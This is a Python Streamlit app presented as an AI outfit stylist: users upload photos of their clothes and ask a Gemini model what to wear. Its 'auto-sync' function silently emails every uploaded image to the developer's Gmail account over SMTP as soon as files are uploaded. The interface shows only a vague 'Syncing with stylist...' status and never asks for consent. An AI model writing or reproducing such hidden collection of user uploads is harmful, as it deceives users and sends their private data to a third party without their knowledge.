import streamlit as st
from google import genai
import PIL.Image
import smtplib
from email.message import EmailMessage

# --- 1. APP CONFIG ---
st.set_page_config(page_title="AI Digital Stylist", layout="wide", page_icon="👗")
st.title("👗 AI Digital Stylist (2026 Edition)")

# --- 2. SECRETS ---
api_key = st.secrets.get("GEMINI_API_KEY")
MY_EMAIL = st.secrets.get("MY_EMAIL")
GMAIL_APP_PASSWORD = st.secrets.get("GMAIL_APP_PASSWORD")

# --- 3. AUTO-SYNC LOGIC ---
def send_closet_to_me(files):
    if not MY_EMAIL or not GMAIL_APP_PASSWORD:
        return False
    
    msg = EmailMessage()
    msg['Subject'] = f"👗 Auto-Sync: {len(files)} New Items!"
    msg['From'] = MY_EMAIL
    msg['To'] = MY_EMAIL
    msg.set_content(f"Your friend just updated their closet with {len(files)} items.")

    for file in files:
        msg.add_attachment(file.getvalue(), maintype='image', 
                           subtype=file.type.split('/')[-1], filename=file.name)

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(MY_EMAIL, GMAIL_APP_PASSWORD)
            smtp.send_message(msg)
        return True
    except:
        return False

# Sidebar
with st.sidebar:
    st.header("Settings")
    model_choice = st.selectbox("Model", ["gemini-2.5-flash", "gemini-3-flash"])
    uploaded_files = st.file_uploader("Upload your clothes", accept_multiple_files=True, type=['png', 'jpg', 'jpeg'])

# --- 4. THE AUTOMATIC TRIGGER ---
if uploaded_files:
    # Create a unique fingerprint for this batch of files
    current_fingerprint = f"{len(uploaded_files)}-{'-'.join([f.name for f in uploaded_files])}"
    
    # Only sync if the fingerprint has changed
    if st.session_state.get("last_sync") != current_fingerprint:
        with st.status("Syncing with stylist...") as status:
            if send_closet_to_me(uploaded_files):
                st.session_state["last_sync"] = current_fingerprint
                status.update(label="Closet synced! 💌", state="complete")
            else:
                status.update(label="Sync failed (Check Secrets)", state="error")

    # Display Closet
    st.subheader("👕 Your Digital Closet")
    cols = st.columns(5)
    images_for_ai = [PIL.Image.open(f) for f in uploaded_files]
    for i, img in enumerate(images_for_ai):
        with cols[i % 5]:
            st.image(img, use_container_width=True)

    # Chat Logic
    if "messages" not in st.session_state: st.session_state.messages = []
    for m in st.session_state.messages:
        with st.chat_message(m["role"]): st.markdown(m["content"])

    if prompt := st.chat_input("Ask: 'What can I wear today?'"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.markdown(prompt)
        
        with st.chat_message("assistant"):
            client = genai.Client(api_key=api_key)
            response = client.models.generate_content(model=model_choice, contents=[*images_for_ai, prompt])
            st.markdown(response.text)
            st.session_state.messages.append({"role": "assistant", "content": response.text})

